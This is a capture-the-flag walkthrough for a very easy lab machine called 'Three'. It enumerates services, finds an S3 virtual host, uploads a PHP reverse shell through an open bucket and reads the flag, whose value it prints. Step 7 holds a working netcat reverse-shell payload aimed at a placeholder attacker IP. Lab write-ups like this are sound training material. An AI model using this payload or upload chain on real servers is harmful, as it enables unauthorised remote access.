# CTF Walkthrough: Three

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** AWS, S3, Gobuster, Virtual Hosts, Reverse Shell, NetCat
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -sC 10.129.92.142`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey:
            |   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
            |   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
            |_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
            80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
            |_http-title: The Toppers
            |_http-server-header: Apache/2.4.29 (Ubuntu)
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
            ```

2. Visit `10.129.92.142`, in the contact section we see `thetoppers.htb`

3. Add `10.129.92.142` to `/etc/hosts`
    - Command: `sudo vim /etc/hosts`
        - Output:
            ```
            10.129.92.142 thetoppers.htb
            ```
4. Sub-Domain bust
    - Command: `gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u thetoppers.htb --append-domain`
        - Output:
            ```
            ===============================================================
            Starting gobuster in VHOST enumeration mode
            ===============================================================
            Found: s3.thetoppers.htb Status: 404 [Size: 21]
            ```
5. Add `s3.thetoopers.htb` to `/etc/hosts`
    - Command: `sudo vim /etc/hosts`
        - Output:
            ```
            10.129.92.142 thetoppers.htb s3.thetoppers.htb
            ```
6. List all s3 buckets
    - Command: `aws --endpoint=http://s3.thetoppers.htb s3 ls thetoppers.htb`
        - Output:
            ```
                                       PRE images/
            2025-04-22 02:11:37          0 .htaccess
            2025-04-22 02:11:37      11952 index.php
            ```
7. Create a reverse shell php file
    - Reverse Shell Script:
        ```
        <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1    |nc <ATTACKING_IP> 1261 >/tmp/f"); ?>
        ```

8. Upload the script
    - Command: `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

9. Start NetCat
    - Command: `nc -lvnp 1261`

10. Visit `http://thetoppers.htb/shell.php`

11. Get Flag
    - Command: `cat /var/www/flag.txt`
        - Flag : a980d99281a28d638ac68b9bf9453c2b
